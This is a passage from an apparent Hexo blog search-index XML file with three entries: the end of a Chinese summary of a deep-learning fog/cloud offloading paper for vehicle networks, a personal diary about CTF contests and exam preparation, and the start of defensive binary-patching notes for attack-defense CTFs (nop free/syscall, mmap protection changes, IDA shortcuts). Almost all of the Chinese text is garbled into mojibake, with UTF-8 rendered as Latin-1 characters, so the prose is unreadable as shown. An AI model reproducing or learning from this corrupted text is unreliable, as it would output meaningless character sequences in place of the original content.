id="2ï¼‰åˆå§‹åŒ–é˜¶æ®µï¼š">2ï¼‰åˆå§‹åŒ–é˜¶æ®µï¼š</h5><p>å¦‚è¾“å…¥å’Œè¾“å‡ºè®¾è®¡ä¸­æ‰€è¿°ï¼Œæˆ‘ä»¬éœ€è¦æ ‡è®°æ•°æ®æ¥è®­ç»ƒæˆ‘ä»¬çš„CNNæ¨¡å‹ã€‚åœ¨åˆå§‹åŒ–é˜¶æ®µï¼Œæˆ‘ä»¬éœ€è¦è·å–æ ‡è®°æ•°æ®ã€‚åˆå§‹åŒ–é˜¶æ®µçš„ç›®çš„æ˜¯è·å–æ ‡è®°æ•°æ®ï¼Œç”±è¾“å…¥å‘é‡å’Œç›¸åº”çš„è¾“å‡ºç»“æœç»„æˆã€‚ç”¨å…¨å±€è§£å†³æ–¹æ¡ˆæ¥è®­ç»ƒæˆ‘ä»¬çš„ CNN æ¨¡å‹æ˜¯æœ€å¥½çš„ã€‚ç„¶è€Œï¼Œè·å¾—æœ€ä¼˜è§£çš„æ—¶é—´å¤æ‚åº¦ä¸ºO ( nm) ï¼Œè¿™æ˜¯ä¸èƒ½å®¹å¿çš„ã€‚æˆ‘ä»¬é€‰æ‹©ä¸€ç§æŠ˜è¡·çš„æ–¹æ³•æ¥è·å–æ ‡è®°æ•°æ®ï¼Œå…¶ä¸­åˆ©ç”¨å¯å‘å¼ç®—æ³•æ¥è·å¾—æ¥è¿‘æœ€ä¼˜çš„è§£å†³æ–¹æ¡ˆã€‚å¦‚ç®—æ³•1æ‰€ç¤ºï¼Œæ¨¡æ‹Ÿé€€ç«ï¼ˆSAï¼‰ç®—æ³•ä¸»è¦åŒ…æ‹¬ä¸¤ä¸ªå…³é”®æ­¥éª¤ï¼šç”¨ä¸€äº›å‡½æ•°ç”Ÿæˆæ–°è§£ä»¥åŠä»¥ä¸€å®šæ¦‚ç‡æ¥å—æ–°è§£ã€‚æˆ‘ä»¬å°†è´ªå¿ƒç®—æ³•çš„è§£ä½œä¸ºSAç®—æ³•ä¸­çš„åˆå§‹è§£</p><p>SAç®—æ³•åœ¨ä¸€å®šæ¸©åº¦ä¸‹è¿­ä»£Læ¬¡ä»¥æœç´¢å…¨å±€æœ€ä¼˜è§£ã€‚åœ¨æœç´¢è¿‡ç¨‹ä¸­ï¼ŒSAç®—æ³•ä»¥exp( âˆ’ Î”t/ T ) çš„æ¦‚ç‡æ¥å—è¾ƒå·®è§£ï¼Œå…¶ä¸­Î”tæ˜¯æ–°è§£ä¸åŸè§£ä¹‹é—´çš„è¯„ä»·å·®ã€‚é€šè¿‡1SAç®—æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨CNNæ¨¡å‹ä¸­è·å¾—æ ‡è®°æ•°æ®ã€‚æˆ‘ä»¬çš„CNNæ¨¡å‹çš„è¾“å…¥æ˜¯æœ€åHä¸ªé—´éš”ä¸­æœåŠ¡å™¨çš„è®°å½•ä¿¡æ¯ã€‚è¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†æœåŠ¡å™¨çš„è®°å½•ä¿¡æ¯ä»¥åŠå¯¹åº”çš„å¸è½½ç»“æœã€‚</p><h5 id="3ï¼‰è®­ç»ƒé˜¶æ®µï¼š">3ï¼‰è®­ç»ƒé˜¶æ®µï¼š</h5><p>æˆ‘ä»¬ä½¿ç”¨åˆå§‹åŒ–é˜¶æ®µè·å¾—çš„æ•°æ®æ¥è®­ç»ƒCNNæ¨¡å‹ã€‚è®­ç»ƒé˜¶æ®µåŒ…æ‹¬ä¸¤ä¸ªæ­¥éª¤ï¼šåˆå§‹åŒ–æˆ‘ä»¬è®¾è®¡çš„ CNN ä¸­çš„å‚æ•°å¹¶ä½¿ç”¨åå‘ä¼ æ’­ç®—æ³•å¾®è°ƒå‚æ•°ã€‚</p><p>åˆå§‹åŒ–å‚æ•°æœ‰å¿…è¦ï¼Œæœ‰åˆ©äºåŠ å¿«æ”¶æ•›é€Ÿåº¦ã€‚ CNN å‚æ•°ç”±å¹³å‡å€¼ä¸ºé›¶çš„æ­£æ€é«˜æ–¯åˆ†å¸ƒåˆå§‹åŒ–ã€‚</p><p>å¯¹äºå‰é¦ˆç¥ç»ç½‘ç»œï¼Œå‚æ•°ä¼˜åŒ–å–å†³äºè¯¯å·®åå‘ä¼ æ’­ã€‚ä¼˜åŒ–é˜¶æ®µå¯ä»¥é€šè¿‡éšæœºæ¢¯åº¦ä¸‹é™ç®—æ³•æˆ–Adamç®—æ³•æ¥å®Œæˆã€‚ç”±äºAdamç®—æ³•æ˜¯è‡ªé€‚åº”çš„ï¼Œæˆ‘ä»¬é€‰æ‹©å®ƒä½œä¸ºè®­ç»ƒé˜¶æ®µçš„ä¼˜åŒ–ç®—æ³•ï¼Œå¦‚ç®—æ³•2æ‰€ç¤ºã€‚åœ¨è®­ç»ƒé˜¶æ®µï¼Œæˆ‘ä»¬é‡‡ç”¨äº¤å‰ç†µæˆæœ¬å‡½æ•°ä½œä¸ºæŸå¤±å‡½æ•°ã€‚å› æ­¤ï¼Œè¾“å‡ºæ˜¯ä¸€ä¸ªæ ‡é‡ï¼Œå®ƒæ˜¯è¾“å‡ºå±‚ä¸­æœ€å¤§å€¼çš„ç¥ç»å…ƒç´¢å¼•ã€‚</p><h5 id="4ï¼‰è¿è¡Œé˜¶æ®µï¼š">4ï¼‰è¿è¡Œé˜¶æ®µï¼š</h5><p>åœ¨è¿è¡Œé˜¶æ®µï¼Œæ‰€æœ‰æœåŠ¡å™¨éƒ½éœ€è¦è®°å½•ä¸€æ®µæ—¶é—´å†…æ¥æ”¶åˆ°çš„è¯·æ±‚æ•°é‡å’Œå¹³å‡åŠŸè€—ï¼Œç„¶åå°†è¿™äº›è®°å½•å‘é€åˆ°è¾¹ç¼˜è®¡ç®—èŠ‚ç‚¹ã€‚è¿™æ ·ï¼Œæ¯ä¸ªè¾¹ç¼˜èŠ‚ç‚¹å°±å¯ä»¥å°†è¿™äº›è®°å½•ä½œä¸ºè¾“å…¥æ¥è®¡ç®—å¸è½½ç»“æœã€‚ä¸è®­ç»ƒé˜¶æ®µç›¸æ¯”ï¼Œè¿è¡Œé˜¶æ®µçš„è®¡ç®—å¤æ‚åº¦ç›¸å¯¹è¾ƒä½ã€‚è®­ç»ƒè¿‡ç¨‹å®šæœŸç¦»çº¿è¿›è¡Œï¼Œä»¥æ›´æ–° CNN æ¨¡å‹ä¸­çš„æƒé‡ã€‚ç„¶è€Œï¼Œæœ‰å¯èƒ½è·å¾—ä¸ç¬¦åˆè¦æ±‚çš„ä¸é€‚å½“çš„ç»“æœã€‚</p><p>CNNè¿è¡Œé˜¶æ®µçš„çº¦æŸã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é‡‡ç”¨è´ªå¿ƒç®—æ³•ä½œä¸ºè¡¥å¿ã€‚</p><h3 id="5-æ•ˆæœè¯„ä¼°">5.æ•ˆæœè¯„ä¼°</h3><p>ä¸ºäº†éªŒè¯æ¨¡å‹çš„æ€§èƒ½ï¼Œæˆ‘ä»¬å¯¹å‰ç«¯å’Œåç«¯è¿›è¡Œäº†æ¨¡æ‹Ÿã€‚æˆ‘ä»¬è®¾ç½®N = 20ï¼ŒM = 5ï¼Œn j åœ¨20å’Œ25ä¹‹é—´ï¼Œfi åœ¨4.5å’Œ5.5ä¹‹é—´ï¼Œf j åœ¨2.5å’Œ3.5ä¹‹é—´ï¼Œ5 å’Œ 15MBä¹‹é—´çš„æ•°æ®åŒ…å¤§å°ï¼Œè¯·æ±‚çš„å‘¨æœŸåœ¨ 0.7 åˆ° 0.9 ä¹‹é—´ã€‚æˆ‘ä»¬åœ¨å‰ç«¯ä½¿ç”¨é¢„æµ‹ç»„åˆä¼ è¾“æ¨¡å‹ã€‚åœ¨å‘é€è¯·æ±‚ä¹‹å‰ï¼Œä¼šå‘é€å¹¿æ’­æ•°æ®åŒ…æ¥è¯¢é—®é™„è¿‘çš„è½¦è¾†æˆ–RSUåç«¯å¤„ç†å»¶è¿Ÿã€‚æ ¹æ®å»¶è¯¯ç»“æœå’Œè½¦è¾†é€Ÿåº¦ï¼Œè½¦è¾†å¯ä»¥è®¡ç®—è¯·æ±‚è¿”å›æ—¶åˆ°è¾¾çš„RSUã€‚</p><p>åœ¨ç»“åˆæ¨¡å‹ä¸­ï¼Œä¼°è®¡V2Iã€V2Væ¨¡å‹çš„åŠŸè€—å’Œå»¶è¿Ÿï¼Œé€‰æ‹©æœ€ä¼˜çš„ã€‚åœ¨æ¨¡æ‹Ÿä¸­ï¼Œæˆ‘ä»¬å‡è®¾è½¦è¾†æ²¿ç›´çº¿è¡Œé©¶ã€‚ç”±äºè¾“å…¥æ•°æ®çš„å¤§å°æ˜¯å¯æ§çš„ï¼Œå› æ­¤æˆ‘ä»¬ä¸è€ƒè™‘æ± åŒ–å±‚ã€‚åŸºäºæ·±åº¦å­¦ä¹ çš„æ¨¡å‹çš„ç‰¹å¾å¦‚å›¾3æ‰€ç¤ºã€‚æœ€åå››ä¸ªæ—¶é—´é—´éš”çš„è®°å½•è¢«ç”¨ä½œç½‘ç»œè¾“å…¥ï¼Œå¹¶ä¸”æ—¶é—´é—´éš”è®¾ç½®ä¸º2ç§’ã€‚æ¯ä¸ªæ—¶é—´é—´éš”å†…çš„å¹³å‡è¯·æ±‚æ•°ä¸º 50ã€‚</p><p><img src="/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/image-20240121202500267.png" alt="å›¾3 CNNæ¨¡å‹ç»“æ„"></p><p>å›¾ 4 è¯´æ˜äº†ä¸åŒè½¦é€Ÿå’Œå¯†åº¦ä¸‹çš„æˆæœ¬è¡¨ç°ã€‚åœ¨è½¦é€Ÿè¾ƒé«˜çš„æƒ…å†µä¸‹ï¼Œç»„åˆä¼ åŠ¨æ¨¡å¼çš„æˆæœ¬è¿œä½äºV2Iæ¨¡å¼ã€‚å¯¹äºV2Iæ¨¡å¼ï¼Œéšç€é€Ÿåº¦ä»100åˆ°120ï¼ˆKm/hï¼‰ï¼Œæˆæœ¬æ˜¾ç€å¢é•¿ã€‚è¿™æ˜¯å› ä¸ºå½“è¯·æ±‚è¿”å›æ—¶ï¼Œå¤§å¤šæ•°è½¦è¾†éƒ½å¤„äº RSU è¦†ç›–èŒƒå›´çš„è¾¹ç¼˜ã€‚å› æ­¤ï¼Œå½“é€Ÿåº¦è¶…è¿‡é˜ˆå€¼æ—¶ï¼Œè½¦è¾†å°†é©¶å…¥å¦ä¸€ä¸ª RSUã€‚ V2Iæ¨¡å¼çš„æˆæœ¬å°†æ˜¾ç€å¢åŠ ã€‚å¦å¤–ï¼Œåœ¨æµé‡å¯†åº¦å¤§çš„æƒ…å†µä¸‹ï¼Œç»„åˆä¼ è¾“æ–¹å¼æ•ˆæœæ˜¾ç€ï¼Œå¯ä»¥å¤§å¹…é™ä½V2Væ¨¡å¼ä¸‹æ¯è·³çš„æ—¶å»¶å’ŒåŠŸè€—ã€‚</p><p><img src="/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/image-20240121202552366.png" alt="å›¾4 ç›´æ¥V2Iä¸ç»„åˆä¼ è¾“æ¨¡å¼çš„æˆæœ¬æ¯”è¾ƒ"></p><p>å¦‚å›¾5(a)æ‰€ç¤ºï¼Œä»…é›¾çš„åŠŸè€—æä½ï¼ŒåŒæ—¶å¤„ç†çš„è¯·æ±‚ä¸è¶…è¿‡80ä¸ªã€‚é›¾+äº‘æ¨¡å‹æ¯”çº¯äº‘æ¨¡å‹è¦å¥½å¾—å¤šã€‚æ®è§‚å¯Ÿï¼Œé›¾äº‘æ¨¡å‹çš„åŠŸè€—ä¸ä»…é›¾æ¨¡å‹çš„åŠŸè€—å‡ ä¹ç›¸åŒï¼Œå·¥ä½œè´Ÿè½½åœ¨ 20 åˆ° 80 ä¸ªè¯·æ±‚ä¹‹é—´ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé›¾è®¡ç®—çš„å·¥ä½œè´Ÿè½½å¹¶æœªé¥±å’Œï¼Œå¤§å¤šæ•°è¯·æ±‚éƒ½å¯ä»¥ç”±é›¾èŠ‚ç‚¹å¤„ç†ã€‚å½“å·¥ä½œè´Ÿè½½è¶…è¿‡80ä¸ªè¯·æ±‚æ—¶ï¼Œé›¾å±‚å˜å¾—é¥±å’Œï¼Œé›¾+äº‘æ¨¡å‹ä¸­çš„åŠŸè€—å¢é•¿è¶‹åŠ¿ä¸çº¯äº‘æ¨¡å‹ä¸­çš„åŠŸè€—å¢é•¿è¶‹åŠ¿ç›¸ä¼¼ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬çš„é›¾+äº‘æ¨¡å‹çš„æœ€å¤§å·¥ä½œè´Ÿè½½æ¯”å…¶ä»–ä¸¤ä¸ªæ¨¡å‹å¤§å¾—å¤šï¼Œè¿™è¡¨æ˜å®ƒå¯ä»¥å¾ˆå¥½åœ°åº”å¯¹ä¸åŒçš„æµé‡åˆ†æµéœ€æ±‚ã€‚å›¾ 5(b) è¯´æ˜äº†ä¸åŒè¯·æ±‚æ•°é‡ä¸‹æ€»ç½‘ç»œå»¶è¿Ÿçš„æ€§èƒ½ã€‚æ€»ä½“è€Œè¨€ï¼Œæˆ‘ä»¬çš„é›¾+äº‘æ¨¡å‹çš„å¹³å‡å»¶è¿Ÿå°äº1.5ç§’ï¼Œå¯ä»¥æ»¡è¶³å»¶è¿Ÿçº¦æŸã€‚å¯¹äºä»…äº‘å’Œä»…é›¾å¸è½½ç­–ç•¥ï¼Œéšç€è¯·æ±‚æ•°é‡çš„å¢åŠ ï¼Œå®ƒä»¬çš„æ€»å»¶è¿Ÿè¶‹åŠ¿æ€¥å‰§ä¸Šå‡ï¼Œè€Œæˆ‘ä»¬çš„é›¾+äº‘æ¨¡å‹çš„è¶‹åŠ¿åˆ™ç¼“æ…¢å¢å¼ºã€‚æ­¤å¤–ï¼Œç”±äºç½‘ç»œå»¶è¿Ÿçš„é™åˆ¶ï¼Œè¿™ä¸¤ç§æ–¹æ³•åªèƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šå‡è½»ç½‘ç»œæµé‡çš„è´Ÿæ‹…ã€‚</p><p><img src="/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/image-20240121202947846.png" alt="å›¾5 é›¾+äº‘è®¡ç®—ã€äº‘è®¡ç®—ä¸é›¾è®¡ç®—çš„æ€§èƒ½"></p><p>å¦‚å‰æ‰€è¿°ï¼Œæˆ‘ä»¬å°†æœåŠ¡å™¨çš„æœ€å H é—´éš”è®°å½•ä½œä¸º CNN æ¨¡å‹çš„è¾“å…¥ã€‚æˆ‘ä»¬å°†æœ€åå››ä¸ª Î”t é—´éš”çš„è®°å½•ä½œä¸ºè¾“å…¥ï¼Œå…¶ä¸­ Î”t ç­‰äº 2 ç§’ã€‚åœ¨æ¯ä¸ªé—´éš”Î”tå†…ï¼Œå¹³å‡è¯·æ±‚æ•°ä¸º50ã€‚è®­ç»ƒæ•°æ®æ˜¯é€šè¿‡SAç®—æ³•åœ¨20ä¸ªè¿ç»­é—´éš”å†…è·å¾—çš„ã€‚ç»è¿‡è®­ç»ƒï¼Œæˆ‘ä»¬å¾—åˆ°CNNæ¨¡å‹çš„è¯·æ±‚å¸è½½ç»“æœã€‚ä¸åŒç®—æ³•çš„åŠŸè€—å¦‚å›¾6æ‰€ç¤ºã€‚ä»ä»¿çœŸç»“æœæ¥çœ‹ï¼Œæ¨¡æ‹Ÿé€€ç«ç®—æ³•çš„ç»¼åˆæ€§èƒ½æœ€å¥½ã€‚ç„¶è€Œï¼Œæ¨¡æ‹Ÿé€€ç«ç®—æ³•åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­éå¸¸è€—æ—¶ã€‚æˆ‘ä»¬çš„æ·±åº¦å­¦ä¹ æ¨¡å‹å¯ä»¥æœ‰æ•ˆé™ä½è¿è¡Œé˜¶æ®µçš„è®¡ç®—å¤æ‚åº¦ï¼Œå¹¶ä¸”æ€§èƒ½æ¯”è´ªå¿ƒç®—æ³•è¦å¥½å¾—å¤šã€‚å¯¹äºå»¶è¿Ÿï¼Œè´ªå©ªç®—æ³•ç”±äºå…¶å¯¹æ¯ä¸ªè¯·æ±‚çš„å»¶è¿Ÿä¸¥æ ¼çº¦æŸï¼Œå› æ­¤æ¯”å…¶ä»–ç®—æ³•è¡¨ç°å¾—æ›´å¥½ã€‚å¦‚å›¾6(b)æ‰€ç¤ºï¼Œä¸‰ç§ç®—æ³•çš„å»¶è¿Ÿå‡å°äº1ç§’ã€‚</p><p><img src="/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/image-20240121203046015.png" alt="å›¾6 æ·±åº¦å­¦ä¹ ã€SAå’Œè´ªå¿ƒæ³•çš„åŠŸè€—å’Œå»¶è¿Ÿæ€§èƒ½"></p><h3 id="6-ç»“è®º">6.ç»“è®º</h3><p>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§åŸºäºæ·±åº¦å­¦ä¹ çš„é›¾äº‘æ¨¡å‹ï¼Œè¿™æ˜¯ä¸€ç§é™ä½åç«¯åŠŸè€—å’Œå»¶è¿Ÿçš„å¯è¡Œè§£å†³æ–¹æ¡ˆã€‚å¸è½½ä¼˜åŒ–é—®é¢˜è¢«å…¬å¼åŒ–ã€‚å¯¹äºé›¾èŠ‚ç‚¹ï¼Œæ ¹æ®æ’é˜Ÿè®ºå¯ä»¥å°†å…¶å»ºæ¨¡ä¸ºM/M/1æ¨¡å‹ã€‚å¯¹äºäº‘æœåŠ¡å™¨ï¼Œå®ƒä»¬å¯ä»¥è¢«å»ºæ¨¡ä¸ºM/M/né˜Ÿåˆ—ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§é¢„æµ‹ç»„åˆä¼ è¾“æ¨¡å‹ï¼Œä»¥æœ€å°åŒ–å‰ç«¯æˆæœ¬ã€‚åœ¨ä»¿çœŸä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºè¿™æ ·çš„ç»“è®ºï¼šä¸çº¯äº‘æ¨¡å¼å’Œçº¯é›¾æ¨¡å¼ç›¸æ¯”ï¼Œé›¾äº‘æ¨¡å‹è¡¨ç°å‡ºè‰¯å¥½çš„æ€§èƒ½ã€‚æˆ‘ä»¬çš„æ·±åº¦å­¦ä¹ æ¨¡å‹æ˜¯è§£å†³æ‰€åˆ¶å®šé—®é¢˜çš„è¿‘ä¼¼æ–¹æ³•ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>è®ºæ–‡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Deep Learning</tag>
      
      <tag>IoV</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€äº›æ„Ÿæƒ³</title>
    <link href="/2023/12/26/2023%E6%84%9F%E6%83%B3/"/>
    <url>/2023/12/26/2023%E6%84%9F%E6%83%B3/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><p>éšæ„å†™å†™ï¼Œè®°å½•ä¸€ä¸‹è‡ªå·±çš„2023</p><h2 id="æ—¶å…‰å€’æµ">æ—¶å…‰å€’æµ</h2><p>æ—¶é—´å›åˆ°23å¹´åˆï¼Œå¹´åˆé‚£æ®µæ—¶é—´å¥½åƒæ‰“äº†catctfï¼Œpwnhubå†¬å­£èµ›ï¼Œrwctfï¼Œè¥¿æ¹–è®ºå‰‘ä»€ä¹ˆçš„ã€‚è¿‡å¹´å’Œçˆ¶æ¯å»äº†ç»å…´ï¼Œåƒå²›æ¹–ã€‚</p><p>ç„¶åå¥½åƒä¸¤æœˆå¤šçš„æ—¶å€™ï¼Œå†³å®šè€ƒç ”(æ€»ä¹‹è¿™ä¸€å¹´éƒ½æ˜¯è€ƒç ”)ã€‚åˆšå¼€å§‹å°±æ˜¯èƒŒè‹±è¯­å•è¯å˜›ï¼Œç„¶åç¡®å®šè¦è€ƒçš„ä¸“ä¸šè¯¾408ï¼Œå°±dså­¦è¿‡ï¼Œç„¶åè®¡ç»„æ˜¯é‚£å­¦æœŸåˆšæ•™ï¼ˆå½“ç„¶æˆ‘ä¸Šè¯¾ä¹Ÿæ²¡å¬ï¼‰ï¼Œç„¶åå°±çœ‹çœ‹è®¡ç»„ï¼ˆå¼€å­¦æ­£å¥½ä¹Ÿè¦è€ƒï¼‰</p><p>ä¸‰æœˆä»½ï¼Œåˆšå¼€å­¦æœŸæœ«è€ƒå®Œåï¼Œå·®ä¸å¤šå¼€å§‹æ­£å¼å¤‡è€ƒï¼Œä¸‰å››æœˆä»½å°±åŸºæœ¬ä¸Šå­¦æ•°å­¦+èƒŒå•è¯ï¼Œè·Ÿçš„å¼ å®‡ï¼Œå°±è¿‡ä¸€éå¼ å®‡åŸºç¡€ä¸‰åè®²+300é¢˜ã€‚åŸºæœ¬ä¸Šæ•´å¤©éƒ½å­¦æ•°å­¦ï¼Œå…«ç‚¹åˆ°å›¾ä¹¦é¦†ç„¶åä¹ç‚¹åŠå·®ä¸å¤šèµ°ã€‚ï¼ˆé‚£æ—¶å€™æˆ‘æƒ³çš„æ˜¯ï¼Œæˆ‘ä»ä¸€å¼€å§‹å°±ç›´æ¥æ‹‰æ»¡ï¼Œæœ€åä¸ç›´æ¥æ— æ•Œã€‚ç°åœ¨çœ‹æ¥æ„Ÿè§‰æŒºæç¬‘çš„ï¼Œæ„Ÿè§‰æ›´å¤šå½¢å¼ä¸»ä¹‰ï¼‰</p><p>äº”å…­ä¸ƒæœˆå·®ä¸å¤šï¼Œ408å››é—¨è¯¾è¿‡ä¸€éåŸºç¡€ï¼Œçœ‹ç‹é“è§†é¢‘è¯¾ç„¶ååšé€‰æ‹©å˜›ï¼Œç„¶ååé¢æ„Ÿè§‰æ•°å­¦å­¦å¤ªæ…¢äº†ï¼Œè¦å¼€å¼ºåŒ–äº†ã€‚è¿™æœŸé—´è¿˜å»ç¦å·ï¼Œåˆè‚¥ï¼Œæ‰“å›½èµ›ï¼Œå¤§å“¥å¸¦æˆ‘å’”å’”ä¹±æ€æ‹¿å›½ä¸€ã€‚</p><p>ç„¶åå…«ä¹åæœˆä»½ï¼Œæ•°å­¦å¼ºåŒ–ä¸‰åå…­è®²+1000é¢˜ï¼ˆå°±å†™äº†abç»„ï¼Œæ¥ä¸åŠå†™äº†ï¼Œåé¢ä¹Ÿæ¥ä¸åŠçœ‹é”™é¢˜äº†,å¼ºåŒ–è®²ä¹‰åˆåšäº†ä¸€éï¼‰ï¼Œ408ä¹Ÿå¼ºåŒ–ï¼Œå†åšé€‰æ‹©ï¼Œå¼€å†™å¤§é¢˜ã€‚è‹±è¯­çœŸé¢˜é˜…è¯»å·®ä¸å¤šåšçš„åªå‰©ä¸‰å¹´ã€‚</p><p>æœ€åäº”å…­åå¤©ï¼Œå†™äº†è¿‘15å¹´æ•°å­¦çœŸé¢˜ï¼Œæ¨¡æ‹Ÿå·å°±å†™å®Œäº†å¼ å…«ã€‚23å¹´æå…­ï¼Œ24æå…­ï¼Œå¼ å››å„å·®ä¸å¤šå†™äº†ä¸¤å¼ ã€‚408åšäº†åå‡ å¹´çœŸé¢˜å·å­ã€‚</p><p>æœ€åä¸¤å‘¨ï¼Œè‚–å››å¤§é¢˜å°±èƒŒäº†ä¸¤å¥—å¤šç‚¹ï¼Œè‚–å…«è‚–å››é€‰æ‹©åˆ·çƒ‚äº†ï¼Œè‹±è¯­è‡ªå·±æ•´äº†ä¸ªå¤§ä½œæ–‡æ¨¡æ¿ï¼Œè€ƒå‰æŠŠå®Œæ•´çš„æ¨¡è€ƒäº†22ï¼Œ23å¹´ã€‚408çœŸé¢˜ä¹Ÿè€ƒå‰åšå®Œ</p><p>ç„¶åå°±å¼€è€ƒäº†ï¼Œæˆ‘è®°å¾—æˆ‘è€ƒæ”¿æ²»è‹±è¯­å‰æ™šï¼Œtmå¤±çœ äº†å±…ç„¶ï¼Œé†’æ¥ä¸‰å››æ¬¡ã€‚è¿˜è®°å¾—è€ƒæ”¿æ²»çš„æ—¶å€™ï¼Œæˆ‘å¡«å¥½æ”¿æ²»ç­”é¢˜å¡ä¿¡æ¯ï¼Œè¯•é¢˜å·ä¸€å‘ä¸‹æ¥ï¼Œæˆ‘ä¸€æ™ƒç¥ï¼ŒåŸæ¥çœŸçš„å·²ç»å¼€å§‹è€ƒè¯•äº†â€¦ç„¶åç¬¬äºŒå¤©è€ƒæ•°å­¦å’Œ408ï¼Œwocæ˜¯çœŸéš¾å•Šã€‚æ•°å­¦æˆ‘éƒ½å†™æ‡µäº†ï¼Œ408ä¹Ÿè¦æ¥ä¸åŠå†™äº†ï¼Œå¹³å¸¸éƒ½ä¼šçš„oså¤§é¢˜å±…ç„¶ä¸ä¼šï¼Œè®¡ç½‘å¤§é¢˜BGPæ›´æ˜¯ä¸ªå‡ æŠŠâ€¦</p><h2 id="å¾€å“ªå»ï¼Ÿ">å¾€å“ªå»ï¼Ÿ</h2><p>æ¬¸ï¼Œè¿™ä¸€å¹´è¿‡çš„å¥½å¿«ï¼Œæœ€å¤§æ„Ÿè§‰å°±æ˜¯é’æ˜¥å°±è¦ç»“æŸäº†ï¼Œè‡ªå·±ä¹Ÿå¤§å››äº†ï¼Œå¤§å­¦ç”Ÿæ´»å°±è¦ç»“æŸäº†ï¼Œä½†æˆ‘ä¸æƒ³è¿™ä¹ˆè¿‡â€¦</p><p>è€ƒç ”çš„æ—¶å€™æˆ‘åœ¨æƒ³ï¼Œè€ƒå®Œç ”æˆ‘è¦æ¥ä¸€è¶Ÿç•…å¿«çš„æ—…è¡Œï¼Œè¦å¥½å¥½çš„é”»ç‚¼èº«ä½“ï¼Œè¦è®©è‡ªå·±è¿‡çš„å¼€å¿ƒã€‚</p><p>ä½†æ˜¯æˆ‘æ„Ÿè§‰æˆ‘è€ƒçš„ä¸å¤ªå¥½ï¼Œä½†æˆ‘ç¡®å®æœ‰åœ¨è®¤çœŸå­¦ï¼ŒæŒºæ— å¥ˆçš„ã€‚</p><p>è¯»ç ”ï¼Ÿå·¥ä½œï¼ŸäºŒæˆ˜ï¼Ÿå…ˆå‡†å¤‡èµ·æ¥ï¼Œæ€»ä¹‹åˆ°æ—¶å€™çœ‹å§ï¼Œç­‰æˆç»©â€¦</p>]]></content>
    
    
    <categories>
      
      <category>æ—¥è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>???</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWD pwn fix</title>
    <link href="/2023/06/24/AWDp/"/>
    <url>/2023/06/24/AWDp/</url>
    
    <content type="html"><![CDATA[<p>æ¯”èµ›ä¸­å¸¸è§çš„ Fix æ–¹æ³•ï¼š</p><ul><li>nop free/syscall</li><li>mmap 7 æ”¹ä¸º 3</li><li>ç¼©å° size</li></ul><h2 id="ç»†èŠ‚çŸ¥è¯†">ç»†èŠ‚çŸ¥è¯†</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//64 syscall table</span><br><span class="hljs-number">0</span>sys_read<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd<span class="hljs-type">char</span> *buf<span class="hljs-type">size_t</span> count<br><span class="hljs-number">1</span>sys_write<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd<span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf<span class="hljs-type">size_t</span> count<br><span class="hljs-number">2</span>sys_open<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename<span class="hljs-type">int</span> flags<span class="hljs-type">int</span> mode<br></code></pre></td></tr></table></figure><h2 id="IDA-Patch">IDA Patch</h2><h3 id="å¿«æ·é”®">å¿«æ·é”®</h3><p>æ”¹å‡½æ•°åå­—ï¼šn</p><p>ä¿®è¡¥å­—èŠ‚æ•°ï¼šctrl+alt+p</p><p>key patch: ctrl+alt+k</p><p>æ’¤é”€ï¼šctrl+z/ctrl+yï¼Œç¼–è¾‘-&gt;Keypatch-&gt;Undo last Patching</p><p>è·³è½¬åˆ°æŒ‡å®šæ®µï¼šctrl+s</p><p>ç¼–è¾‘-&gt;å‡½æ•°-&gt;åˆ›å»ºå‡½æ•°ï¼šp</p><p>â€‹å¯ä»¥çœ‹.eh_frameçš„æ±‡ç¼–</p><p><strong>ä¿®äº†åˆ«å¿˜äº†ä¿å­˜ï¼š</strong> ç¼–è¾‘-&gt;ä¿®è¡¥ç¨‹åº-&gt;ä¿®è¡¥ç¨‹åºåº”ç”¨åˆ°è¾“å…¥æ–‡ä»¶</p><h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²">æ ¼å¼åŒ–å­—ç¬¦ä¸²</h3><p><strong>å®¹æ˜“é€ æˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å‡½æ•°</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">printf</span> <span class="hljs-params">( <span class="hljs-type">const</span> <span class="hljs-type">char</span> * format, ... )</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fprintf</span> <span class="hljs-params">( FILE * stream, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * format, ... )</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sprintf</span> <span class="hljs-params">( <span class="hljs-type">char</span> * str, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * format, ... 